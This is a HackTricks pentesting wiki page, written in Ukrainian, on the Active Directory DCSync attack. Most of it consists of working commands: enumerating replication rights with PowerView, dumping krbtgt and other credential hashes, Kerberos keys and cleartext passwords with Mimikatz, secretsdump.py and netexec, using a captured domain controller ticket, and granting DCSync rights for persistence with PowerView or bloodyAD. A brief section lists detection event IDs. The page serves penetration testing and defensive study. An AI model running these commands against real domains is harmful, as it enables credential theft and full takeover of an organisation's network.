# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Permission **DCSync** передбачає наявність таких дозволів щодо самого домену: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** і **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Важливі примітки щодо DCSync:**

- **Атака DCSync імітує поведінку Domain Controller і запитує в інших Domain Controllers реплікацію інформації** за допомогою Directory Replication Service Remote Protocol (MS-DRSR). Оскільки MS-DRSR є дійсною та необхідною функцією Active Directory, його неможливо вимкнути або деактивувати.
- За замовчуванням лише групи **Domain Admins, Enterprise Admins, Administrators і Domain Controllers** мають необхідні привілеї.
- На практиці для **повного DCSync** потрібні **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** у контексті іменування домену. `DS-Replication-Get-Changes-In-Filtered-Set` зазвичай делегується разом із ними, але сам по собі він більш актуальний для синхронізації **конфіденційних атрибутів / атрибутів, відфільтрованих RODC** (наприклад, секретів у стилі legacy LAPS), ніж для повного дампу krbtgt.<sup>[[2]](#references)</sup>
- Якщо паролі будь-яких облікових записів зберігаються із застосуванням оборотного шифрування, у Mimikatz доступна опція для повернення пароля у відкритому вигляді

### Enumeration

Перевірити, хто має ці дозволи, за допомогою `powerview`:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
Якщо ви хочете зосередитися на **нестандартних принципалах** із правами DCSync, відфільтруйте вбудовані групи, здатні до реплікації, і перевірте лише неочікуваних довірених суб’єктів:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Експлуатація локально
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Віддалена експлуатація
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Практичні приклади з визначеною областю:<sup>[[1]](#references)</sup>
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### DCSync за допомогою захопленого TGT машини DC (ccache)

У сценаріях `export-mode` для `unconstrained-delegation` можна захопити TGT машини Domain Controller (наприклад, `DC1$@DOMAIN` для `krbtgt@DOMAIN`). Потім можна використати цей ccache для автентифікації як DC і виконати DCSync без пароля.<sup>[[5]](#references)</sup>
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Операційні нотатки:

- **Kerberos path в Impacket спочатку звертається до SMB** перед викликом DRSUAPI. Якщо в середовищі застосовується **SPN target name validation**, повний dump може завершитися помилкою з повідомленням `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- У такому разі спочатку запросіть service ticket **`cifs/<dc>`** для цільового DC або скористайтеся **`-just-dc-user`** для облікового запису, який вам негайно потрібен.
- Навіть за наявності лише нижчих прав реплікації LDAP/DirSync-style syncing все одно може розкрити **confidential** або **RODC-filtered** атрибути (наприклад, застарілий `ms-Mcs-AdmPwd`) без повної реплікації krbtgt.<sup>[[2]](#references)</sup>

`-just-dc` генерує 3 файли:

- один із **NTLM hashes**
- один із **Kerberos keys**
- один із паролями у відкритому тексті з NTDS для будь-яких облікових записів, у яких увімкнено [**оборотне шифрування**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Користувачів із оборотним шифруванням можна отримати за допомогою

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

Якщо ви domain admin, ці дозволи можна надати будь-якому користувачеві за допомогою PowerView:<sup>[[3]](#references)</sup>
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Оператори Linux можуть зробити те саме за допомогою `bloodyAD`:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Потім можна **перевірити, чи користувачу було правильно призначено** 3 привілеї, знайшовши їх у виводі (ви маєте побачити назви привілеїв у полі "ObjectType"):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- Security Event ID 4662 (Audit Policy for object must be enabled) – На об’єкті було виконано операцію<sup>[[4]](#references)</sup>
- Security Event ID 5136 (Audit Policy for object must be enabled) – Об’єкт служби каталогів було змінено
- Security Event ID 4670 (Audit Policy for object must be enabled) – Дозволи на об’єкт було змінено
- AD ACL Scanner - Створює та порівнює звіти про ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket Журнал змін](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Використання Replication Get-Changes і Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Отримання хешів паролів із контролера домену](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — облікові дані SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync до DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
